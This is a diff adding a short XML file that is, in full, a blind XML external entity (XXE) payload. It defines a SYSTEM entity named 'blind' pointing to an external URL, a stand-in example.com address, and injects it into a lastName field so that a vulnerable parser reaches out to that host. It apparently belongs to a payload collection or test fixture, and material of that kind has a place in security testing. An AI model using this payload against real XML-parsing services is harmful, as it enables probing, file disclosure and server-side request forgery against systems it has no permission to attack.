@@ -1,0 +1,7 @@
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY blind SYSTEM "https://www.example.com/;">]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&blind;</lastName>
+ </userInfo>
+ 
